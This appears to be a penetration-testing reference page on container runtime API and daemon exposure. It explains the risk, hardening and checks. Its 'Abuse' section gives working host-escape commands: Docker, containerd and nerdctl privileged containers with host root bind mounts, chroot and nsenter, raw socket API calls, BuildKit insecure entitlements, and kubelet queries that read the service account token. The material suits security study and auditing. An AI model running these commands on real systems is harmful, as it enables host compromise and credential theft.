# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Many real container compromises do not begin with a namespace escape at all. They begin with access to the runtime control plane. If a workload can talk to `dockerd`, `containerd`, CRI-O, Podman, or kubelet through a mounted Unix socket or an exposed TCP listener, the attacker may be able to request a new container with better privileges, mount the host filesystem, join host namespaces, or retrieve sensitive node information. In those cases, the runtime API is the real security boundary, and compromising it is functionally close to compromising the host.

This is why runtime socket exposure should be documented separately from kernel protections. A container with ordinary seccomp, capabilities, and MAC confinement can still be one API call away from host compromise if `/var/run/docker.sock` or `/run/containerd/containerd.sock` is mounted inside it. The kernel isolation of the current container may be working exactly as designed while the runtime management plane remains fully exposed.

## Daemon Access Models

Docker Engine traditionally exposes its privileged API through the local Unix socket at `unix:///var/run/docker.sock`. Historically it has also been exposed remotely through TCP listeners such as `tcp://0.0.0.0:2375` or a TLS-protected listener on `2376`. Exposing the daemon remotely without strong TLS and client authentication effectively turns the Docker API into a remote root interface.

containerd, CRI-O, Podman, and kubelet expose similar high-impact surfaces. The names and workflows differ, but the logic does not. If the interface lets the caller create workloads, mount host paths, retrieve credentials, or alter running containers, the interface is a privileged management channel and should be treated accordingly.

Common local paths worth checking are:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Older or more specialized stacks may also expose endpoints such as `dockershim.sock`, `frakti.sock`, or `rktlet.sock`. Those are less common in modern environments, but when encountered they should be treated with the same caution because they represent runtime-control surfaces rather than ordinary application sockets.

## Secure Remote Access

If a daemon must be exposed beyond the local socket, the connection should be protected with TLS and preferably with mutual authentication so the daemon verifies the client and the client verifies the daemon. The old habit of opening the Docker daemon on plain HTTP for convenience is one of the most dangerous mistakes in container administration because the API surface is strong enough to create privileged containers directly.

The historical Docker configuration pattern looked like:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

On systemd-based hosts, daemon communication may also appear as `fd://`, meaning the process inherits a pre-opened socket from systemd rather than binding it directly itself. The important lesson is not the exact syntax but the security consequence. The moment the daemon listens beyond a tightly permissioned local socket, transport security and client authentication become mandatory rather than optional hardening.

## Abuse

If a runtime socket is present, confirm which one it is, whether a compatible client exists, and whether raw HTTP or gRPC access is possible:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

These commands are useful because they distinguish between a dead path, a mounted but inaccessible socket, and a live privileged API. If the client succeeds, the next question is whether the API can launch a new container with a host bind mount or host namespace sharing.

### When No Client Is Installed

The absence of `docker`, `podman`, or another friendly CLI does not mean the socket is safe. Docker Engine speaks HTTP over its Unix socket, and Podman exposes both a Docker-compatible API and a Libpod-native API through `podman system service`. That means a minimal environment with only `curl` may still be enough to drive the daemon:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

This matters during post-exploitation because defenders sometimes remove the usual client binaries but leave the management socket mounted. On Podman hosts, remember that the high-value path differs between rootful and rootless deployments: `unix:///run/podman/podman.sock` for rootful service instances and `unix://$XDG_RUNTIME_DIR/podman/podman.sock` for rootless ones.

### Full Example: Docker Socket To Host Root

If `docker.sock` is reachable, the classical escape is to start a new container that mounts the host root filesystem and then `chroot` into it:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

This provides direct host-root execution through the Docker daemon. The impact is not limited to file reads. Once inside the new container, the attacker can alter host files, harvest credentials, implant persistence, or start additional privileged workloads.

### Full Example: Docker Socket To Host Namespaces

If the attacker prefers namespace entry instead of filesystem-only access:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

This path reaches the host by asking the runtime to create a new container with explicit host-namespace exposure rather than by exploiting the current one.

### Full Example: containerd Socket

A mounted `containerd` socket is usually just as dangerous:

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

If a more Docker-like client is present, `nerdctl` can be more convenient than `ctr` because it exposes familiar flags such as `--privileged`, `--pid=host`, and `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

The impact is again host compromise. Even if Docker-specific tooling is absent, another runtime API may still offer the same administrative power. On Kubernetes nodes, `crictl` may also be enough for reconnaissance and container interaction because it speaks the CRI endpoint directly.

### BuildKit Socket

`buildkitd` is easy to miss because people often think of it as "just the build backend", but the daemon is still a privileged control plane. A reachable `buildkitd.sock` can allow an attacker to run arbitrary build steps, inspect worker capabilities, use local contexts from the compromised environment, and request dangerous entitlements such as `network.host` or `security.insecure` when the daemon was configured to allow them.

Useful first interactions are:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

If the daemon accepts build requests, test whether insecure entitlements are available:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

The exact impact depends on daemon configuration, but a rootful BuildKit service with permissive entitlements is not a harmless developer convenience. Treat it as another high-value administrative surface, especially on CI runners and shared build nodes.

### Kubelet API Over TCP

The kubelet is not a container runtime, but it is still part of the node management plane and often sits in the same trust boundary discussion. If the kubelet secure port `10250` is reachable from the workload, or if node credentials, kubeconfigs, or proxy rights are exposed, the attacker may be able to enumerate Pods, retrieve logs, or execute commands in node-local containers without ever touching the Kubernetes API server admission path.

Start with cheap discovery:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

If the kubelet or API-server proxy path authorizes `exec`, a WebSocket-capable client can turn that into code execution in other containers on the node. This is also why `nodes/proxy` with only `get` permission is more dangerous than it sounds: the request can still reach kubelet endpoints that execute commands, and those direct kubelet interactions do not show up in normal Kubernetes audit logs.

## Checks

The goal of these checks is to answer whether the container can reach any management plane that should have remained outside the trust boundary.

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

What is interesting here:

- A mounted runtime socket is usually a direct administrative primitive rather than mere information disclosure.
- A TCP listener on `2375` without TLS should be treated as a remote-compromise condition.
- Environment variables such as `DOCKER_HOST` often reveal that the workload was intentionally designed to talk to the host runtime.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` listens on the local socket and the daemon is usually rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | No long-lived privileged daemon is required for ordinary local use; API sockets may still be exposed when `podman system service` is enabled | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | Administrative API exposed through the local socket and usually consumed by higher-level tooling | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | CRI endpoint is intended for node-local trusted components | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet should not be broadly reachable from Pods; access may expose pod state, credentials, and execution features depending on authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
